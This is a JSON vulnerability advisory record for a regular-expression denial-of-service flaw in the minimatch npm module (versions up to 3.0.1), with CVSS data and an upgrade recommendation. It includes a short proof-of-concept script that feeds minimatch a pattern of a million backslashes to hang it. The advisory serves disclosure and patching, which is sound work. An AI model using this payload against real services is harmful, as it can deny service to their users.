{
  "id": 118,
  "created_at": "2016-05-25",
  "updated_at": "2016-08-09",
  "title": "Regular Expression Denial of Service",
  "author": {
    "name": "Nick Starke",
    "website": null,
    "username": null
  },
  "module_name": "minimatch",
  "publish_date": "2016-06-20",
  "cves": [],
  "vulnerable_versions": "<=3.0.1",
  "patched_versions": ">=3.0.2",
  "overview": "Minimatch is a minimal matching utility that works by converting glob expressions into JavaScript `RegExp` objects.  The primary function, `minimatch(path, pattern)` is vulnerable to ReDoS in the `pattern` parameter.  This is because of the regular expression on line 521 of minimatch.js: `/((?:\\\\{2})*)(\\\\?)\\|/g,`.  The problematic portion of the regex is `((?:\\\\{2})*)` which matches against `\\\\`.\n\nA proof of concept is as follows:\n```\nvar minimatch = require(“minimatch”);\n\n// utility function for generating long strings\nvar genstr = function (len, chr) {\n  var result = “”;\n  for (i=0; i<=len; i++) {\n    result = result + chr;\n  }\n  return result;\n}\n\nvar exploit = “[!” + genstr(1000000, “\\\\”) + “A”;\n\n// minimatch exploit.\nconsole.log(“starting minimatch”);\nminimatch(“foo”, exploit);\nconsole.log(“finishing minimatch”);\n```",
  "recommendation": "Updated to version 3.0.2 or greater",
  "references": [
    "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"
  ],
  "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
  "cvss_score": 7.5,
  "coordinating_vendor": "^Lift Security"
}
